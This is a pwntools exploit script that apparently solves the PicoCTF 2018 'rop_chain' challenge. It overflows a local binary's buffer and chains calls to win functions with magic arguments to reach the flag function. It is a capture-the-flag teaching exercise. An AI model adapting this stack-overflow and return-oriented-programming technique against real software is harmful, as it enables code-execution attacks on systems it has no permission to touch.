# coding:utf-8

from pwn import *

context.log_level = 'debug'

p = process('PicoCTF_2018_rop_chain')

padding = 'a' * 0x18
fake_ebp = 'jkjk'
flag_addr = 0x0804862B
win_function1_addr = 0x080485CB
win_function2_addr = 0x080485D8
win2_arg = 0xBAAAAAAD
flag_arg = 0xDEADBAAD
payload = padding + fake_ebp

payload += p32(win_function1_addr) # 设置win1的值
payload += p32(win_function2_addr) + p32(flag_addr) # 设置win2的值
payload += p32(win2_arg) + p32(flag_arg) # 设置两个函数各自的a1参数

p.sendlineafter('input> ', payload)

p.interactive()
